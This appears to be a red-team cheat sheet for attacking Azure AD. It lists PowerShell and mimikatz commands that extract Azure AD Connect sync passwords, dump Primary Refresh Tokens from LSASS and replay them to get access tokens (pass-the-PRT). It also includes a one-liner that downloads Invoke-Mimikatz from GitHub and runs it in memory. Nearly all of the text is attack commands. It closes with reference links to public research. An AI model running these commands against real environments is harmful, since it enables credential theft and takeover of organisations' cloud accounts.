# Azure AD

## On Prem

## PHS 

```powershell
#Check if exists MSOL_**** Account or Sync_****
# IN Azure AD Connect Server extract Password
Get-AADIntSyncCredentials
```

### Pass the PRT (Primary Refresh Token)

> If you don’t see any PRT data it could be that you don’t have any PRTs because your device isn’t Azure AD joined or it could be you are running an old version of Windows 10.

```powershell
# Check if you have a PRT
dsregcmd.exe /status #AzureAdJoined: YES
# Extract LSASS
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap
# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
# Attack
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce #page 105 Azure AD attacks
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken -SaveToCache
```

### Azure AD Connect

```powershell
# Check
Get-ADSyncConnector
```

## References

- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- https://blog.netwrix.com/2023/05/13/pass-the-prt-overview/
- https://aadinternals.com/post/prt/
- https://github.com/morRubin/PrtToCert
- https://github.com/morRubin/AzureADJoinedMachinePTC